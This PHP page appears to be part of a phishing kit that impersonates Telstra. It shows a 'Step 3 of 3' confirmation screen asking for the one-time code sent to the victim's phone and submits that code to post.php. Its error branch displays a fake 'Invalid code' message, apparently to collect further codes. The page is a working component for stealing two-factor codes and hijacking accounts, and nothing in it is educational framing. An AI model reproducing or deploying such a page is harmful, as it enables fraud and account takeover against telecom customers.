<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>telstra</title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
    <header>
        <div class="pic">
            <img src="res/img/logo.png" alt="">
        </div>
    </header>

    <main>
        <div class="container">
            <div class="step">
            <span> STEP 3 OF 3</span>
            <div class="title">
            <h2>Confirmation</h2>
            </div>
            </div>
            <div class="col">
                <form action="post.php" method="post">
                <p>Please enter the code sent to your phone number to continue.</p>
                <input type="text" placeholder="Enter code" name="otp" required>
                    <?php 
            if(isset($_GET['error'])){
            echo '<input type="hidden" name="exit">';
            echo '<p style="color:red;">Invalid code. Please try again.</p>';
            }
            ?>
                    <div class="btn">
                    <button type="submit">Next</button>
                    </div>
                </form>
            </div>
        </div>
    </main>
    <footer>
        <div class="links">
            <a href="#" class="copy">Copyright © 2025 Telstra</a><span>|</span>
            <a href="#">Privacy</a><span>|</span>
            <a href="#">Terms of use</a>
        </div>
    </footer>
</body>
</html>